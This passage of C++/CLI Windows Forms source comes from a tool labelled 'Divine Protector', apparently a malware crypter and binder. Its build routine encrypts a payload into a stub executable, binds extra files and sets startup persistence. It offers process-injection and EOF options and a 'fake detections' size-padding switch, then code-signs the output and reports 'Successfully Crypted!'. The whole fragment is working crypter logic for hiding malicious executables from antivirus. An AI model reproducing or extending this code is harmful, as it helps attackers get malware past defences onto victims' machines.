				{
					if(argument[strlen(argument)-1] != '+')
					{
					argument[strlen(argument)+1] = '\0';
					argument[strlen(argument)] = '+';
					}



					WriteArguments(L"Done.exe",320,(BYTE *)argument,strlen(argument));
					
				}
				else
				{
                  MessageBox(NULL,"Write Command Line Arguments!","Divine Protector",NULL);
				}

			 }
			 else
			 {

				  WriteArguments(L"Done.exe",320,(BYTE *)"1pike",strlen("1pike"));

			 }


	       if(fake == true)
		   {
            fs = fs + ( fs/ 2 ); 
		   }


		  //reverse(FB);
		      enc();
			  Crypt(FB,strlen(FB),Key,strlen(Key));

			  /*for(int s = 0;s<14;s++)
			  { 
                
				swap(FB);
				reverse(FB);
                bump(FB);   
				reverse(FB);
				shift(FB);
			  }
			  */
		  //reverse(FB);
		  
			  strcpy(delay2,delay);
             
			  strcat(delay2,":");

		      WriteToResources(L"Done.exe",48,(BYTE *)delay2,strlen(delay2));

			  WriteToResources(L"Done.exe",286,(BYTE *)FB,fs);

			  encrypt(all);

			  WriteToResources(L"Done.exe",200,(BYTE *)all,strlen(all));

			  strcpy(all,all2);

			  int f = 0;
			  for (int x = 0; x < Files->Items->Count; x++)
	              {
		              if (Files->GetItemChecked(x))
					  {
						  char * temp = (char*)(void*)Marshal::StringToHGlobalAnsi(Files->GetItemText(Files->Items[x]));
						  GetFileName(fileb,temp);
						  strcat(fileb,"1");
						  strcat(filee,"|");
						  strcat(filee,fileb);
						  GetFile(temp);
						  enc2();
			              Crypt(Bind,strlen(Bind),Key,strlen(Key));
						  WriteToResources(L"Done.exe",960+f,(BYTE *)Bind,gh);
						  f= f +1;

					  }
					  else
					  {
						  char * temp = (char*)(void*)Marshal::StringToHGlobalAnsi(Files->GetItemText(Files->Items[x]));
						  GetFileName(fileb,temp);
						  strcat(fileb,"0");
						  strcat(filee,"|");
						  strcat(filee,fileb);
						  GetFile(temp);
						  enc2();
			              Crypt(Bind,strlen(Bind),Key,strlen(Key));
						  WriteToResources(L"Done.exe",960+f,(BYTE *)Bind,gh);
						  f= f +1;
					  }
			      }
			     WriteToResources(L"Done.exe",958,(BYTE *)filee,sizeof(filee));

				 free(Bind);
/*char* chars_array = strtok(filee, "|");
    while(chars_array)
    {
        MessageBox(NULL, chars_array, NULL, NULL);
        chars_array = strtok(NULL, "|");
    }
	*/
           

			if(checkBox1->Checked == true)
			{

				if(startup->Text != "")
				{

                    WriteStartup(L"Done.exe",392,(BYTE *)start,strlen(start));
				}
				else
				{
					MessageBox(NULL,"Write Startup Name!","Divine Protector",NULL);
					return;
				}

			}
			else
			{

				WriteStartup(L"Done.exe",392,(BYTE *)"1pike",strlen("1pike"));

			}

			if(selfinject == true)
			 {
			           
				 if(eof2 == true)
			     {
                       WriteEof();
			     }

			 }

			 if(selfinject == false)
			 {
			           
				 if(eof2 == true)
			     {
					 MessageBox(NULL,"Can't use EOF and Process Injection!","Divine Protector",NULL);
					 return;
			     }

			 }

		STARTUPINFOA siStartupInfo; 
    PROCESS_INFORMATION piProcessInfo; 
    memset(&siStartupInfo, 0, sizeof(siStartupInfo)); 
    memset(&piProcessInfo, 0, sizeof(piProcessInfo)); 
    siStartupInfo.cb = sizeof(siStartupInfo); 

	CreateProcessA(NULL, "signtool.exe sign /t http://timestamp.verisign.com/scripts/timstamp.dll /a Done.exe", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &siStartupInfo, &piProcessInfo);


			MessageBox(NULL,"Successfully Crypted!","Divine Protector",NULL);

			DeleteUrlCacheEntryA(stub);
			Files->Items->Clear();
			file->Text = "";



		 }
private: System::Void checkBox2_CheckedChanged_1(System::Object^  sender, System::EventArgs^  e) {

			  if(EOF1 -> Checked == true)
			 {
			   listBox1 -> Enabled = false;
			   process -> Checked = false;
			   selfinject = true;
			   eof2 = true;
			 }
			  if(EOF1 -> Checked == false)
			 {
			   eof2 = false;
			 }

		 }
private: System::Void fakedetections_CheckedChanged(System::Object^  sender, System::EventArgs^  e) {
			 

			if(fakedetections -> Checked == true)
			 {
			   fake = true;
			 }
			  if(fakedetections -> Checked == false)
			 {
			   fake = false;
			 }
		 }
private: System::Void button3_Click(System::Object^  sender, System::EventArgs^  e) {


			  if(openFileDialog1->ShowDialog() == System::Windows::Forms::DialogResult::OK)
      {
        Icons->Text = openFileDialog1->FileName;
		ikonica = (char*)(void*)Marshal::StringToHGlobalAnsi(Icons->Text->ToString());
            
      }

		 }
private: System::Void tabPage3_Click(System::Object^  sender, System::EventArgs^  e) {
		 }
private: System::Void name_TextChanged(System::Object^  sender, System::EventArgs^  e) {
		 }
private: System::Void cmnd_TextChanged(System::Object^  sender, System::EventArgs^  e) {

			  argument = (char*)(void*)Marshal::StringToHGlobalAnsi(cmnd->Text->ToString());

		 }
private: System::Void webBrowser1_DocumentCompleted(System::Object^  sender, System::Windows::Forms::WebBrowserDocumentCompletedEventArgs^  e) {

		 }
private: System::Void textBox1_TextChanged(System::Object^  sender, System::EventArgs^  e) {

			 delay = (char*)(void*)Marshal::StringToHGlobalAnsi(edelay->Text->ToString());
		 }
private: System::Void checkedListBox1_SelectedIndexChanged(System::Object^  sender, System::EventArgs^  e) {
		 }
private: System::Void button4_Click(System::Object^  sender, System::EventArgs^  e) {

			  if(openFileDialog1->ShowDialog() == System::Windows::Forms::DialogResult::OK)
      {
		file->Text = "";
        file->Text = openFileDialog1->FileName;
		this->Files->Items->Insert(0, openFileDialog1->FileName);
            
      }
		 }
private: System::Void label3_Click(System::Object^  sender, System::EventArgs^  e) {
		 }
private: System::Void rounds_TextChanged(System::Object^  sender, System::EventArgs^  e) {
		 }

};
}

